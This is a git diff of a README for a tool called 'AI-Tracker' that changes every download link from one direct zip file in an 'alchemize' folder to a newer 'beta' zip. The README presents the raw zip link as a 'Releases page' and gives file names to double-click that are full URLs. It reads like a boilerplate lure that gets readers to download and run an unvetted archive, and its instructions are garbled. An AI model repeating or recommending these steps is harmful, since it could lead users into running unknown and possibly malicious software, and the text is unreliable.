@@ -1,6 +1,6 @@
 # 🚀 AI-Tracker - Organize and Access LLM Resources Easily
 
-[![Download AI-Tracker](https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip%20AI%https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip)](https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip)
+[![Download AI-Tracker](https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip%20AI%https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip)](https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip)
 
 ## 📥 Introduction
 
@@ -12,11 +12,11 @@ Follow these steps to download and set up AI-Tracker.
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip). You will find the latest version of AI-Tracker available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip). You will find the latest version of AI-Tracker available for download.
 
 2. **Choose the Right File**
 
-   On the Releases page, locate the most recent version. It will look like this: `https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip`. Click on it to start the download.
+   On the Releases page, locate the most recent version. It will look like this: `https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip`. Click on it to start the download.
 
 3. **Download AI-Tracker**
 
@@ -28,7 +28,7 @@ Once you have downloaded the file, follow these instructions to install AI-Track
 
 1. **Locate the Downloaded File**
 
-   Open your computer's downloads folder. You should see the downloaded file named something like `https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip`.
+   Open your computer's downloads folder. You should see the downloaded file named something like `https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip`.
 
 2. **Unzip the File**
 
@@ -36,7 +36,7 @@ Once you have downloaded the file, follow these instructions to install AI-Track
 
 3. **Run AI-Tracker**
 
-   Open the folder where you extracted AI-Tracker. Look for a file named `https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip` (or similar). Double-click on it to run the application.
+   Open the folder where you extracted AI-Tracker. Look for a file named `https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip` (or similar). Double-click on it to run the application.
 
 ## 🌐 Using AI-Tracker
 
@@ -65,7 +65,7 @@ To ensure AI-Tracker runs smoothly, make sure your system meets the following re
 
 ## 🔗 Download & Install
 
-If you haven't yet downloaded AI-Tracker, please revisit the [Releases page](https://github.com/Kacper-ctrl-wq/AI-Tracker/raw/refs/heads/main/alchemize/A-Tracker-v1.1.zip) for your download link. This tool is designed to enhance your learning experience with LLMs and related topics.
+If you haven't yet downloaded AI-Tracker, please revisit the [Releases page](https://raw.githubusercontent.com/Kacper-ctrl-wq/AI-Tracker/main/alchemize/A_Tracker_v1.2-beta.5.zip) for your download link. This tool is designed to enhance your learning experience with LLMs and related topics.
 
 Following the steps above should give you a smooth experience with AI-Tracker. If you encounter any issues, feel free to consult the help section or seek assistance in the community forums.
 
